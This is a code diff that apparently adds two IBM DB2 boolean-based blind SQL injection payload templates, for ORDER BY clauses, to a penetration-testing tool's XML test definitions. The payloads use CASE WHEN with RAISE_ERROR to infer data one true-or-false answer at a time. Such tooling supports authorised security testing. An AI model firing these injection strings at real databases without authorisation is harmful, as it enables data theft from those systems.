@@ -1328,6 +1328,44 @@ Tag: <test>
         </details>
     </test>
 
+    <test>
+        <title>IBM DB2 boolean-based blind - ORDER BY clause</title>
+        <stype>1</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>3</clause>
+        <where>1</where>
+        <vector>,(SELECT CASE WHEN [INFERENCE] THEN 1 ELSE RAISE_ERROR(70001, '[RANDSTR]') END FROM SYSIBM.SYSDUMMY1)</vector>
+        <request>
+            <payload>,(SELECT CASE WHEN [RANDNUM]=[RANDNUM] THEN 1 ELSE RAISE_ERROR(70001, '[RANDSTR]') END FROM SYSIBM.SYSDUMMY1)</payload>
+        </request>
+        <response>
+            <comparison>,(SELECT CASE WHEN [RANDNUM]=[RANDNUM1] THEN 1 ELSE RAISE_ERROR(70001, '[RANDSTR]') END FROM SYSIBM.SYSDUMMY1)</comparison>
+        </response>
+        <details>
+            <dbms>IBM DB2</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>IBM DB2 boolean-based blind - ORDER BY clause (original value)</title>
+        <stype>1</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>3</clause>
+        <where>1</where>
+        <vector>,(SELECT CASE WHEN [INFERENCE] THEN [ORIGVALUE] ELSE RAISE_ERROR(70001, '[RANDSTR]') END FROM SYSIBM.SYSDUMMY1)</vector>
+        <request>
+            <payload>,(SELECT CASE WHEN [RANDNUM]=[RANDNUM] THEN [ORIGVALUE] ELSE RAISE_ERROR(70001, '[RANDSTR]') END FROM SYSIBM.SYSDUMMY1)</payload>
+        </request>
+        <response>
+            <comparison>,(SELECT CASE WHEN [RANDNUM]=[RANDNUM1] THEN [ORIGVALUE] ELSE RAISE_ERROR(70001, '[RANDSTR]') END FROM SYSIBM.SYSDUMMY1)</comparison>
+        </response>
+        <details>
+            <dbms>IBM DB2</dbms>
+        </details>
+    </test>
+
     <!-- Works in MySQL, Oracle, etc. -->
     <test>
         <title>HAVING boolean-based blind - WHERE, GROUP BY clause</title>
